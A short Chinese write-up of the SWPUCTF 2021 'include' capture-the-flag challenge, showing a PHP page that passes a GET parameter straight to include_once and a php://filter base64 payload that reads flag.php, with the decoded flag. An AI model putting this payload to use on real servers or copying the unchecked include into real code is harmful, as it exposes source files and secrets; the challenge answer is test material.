---
title: '[SWPUCTF 2021 新生赛]include'
date: '2025-05-02T19:27:27+08:00'
weight: 
draft: false
description: '[SWPUCTF 2021 新生赛]include'
---

**提示：** 传入一个file试试

根据提示传入 GET 参数 `?file=`，存在任意文件包含漏洞：`include_once($file);`

```php
<?php
ini_set("allow_url_include","on");
header("Content-type: text/html; charset=utf-8");
error_reporting(0);
$file=$_GET['file'];
if(isset($file)){
    show_source(__FILE__);
    echo 'flag 在flag.php中';
}else{
    echo "传入一个file试试";
}
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
include_once($file);
?> flag 在flag.php中
```

**提示：** flag 在flag.php中

利用 PHP 伪协议读取 `flag.php` 的文件源码

```text
/?file=php://filter/read=convert.base64-encode/resource=flag.php
```

对 base64 编码的 `flag.php` 进行解码

```text
PD9waHANCiRmbGFnPSdOU1NDVEZ7MWJmNDE3YTctY2NjMy00NjkyLTk5OWQtNjMzNjhjODEyZjU1fSc7
```

```php
<?php
$flag='NSSCTF{1bf417a7-ccc3-4692-999d-63368c812f55}';
```
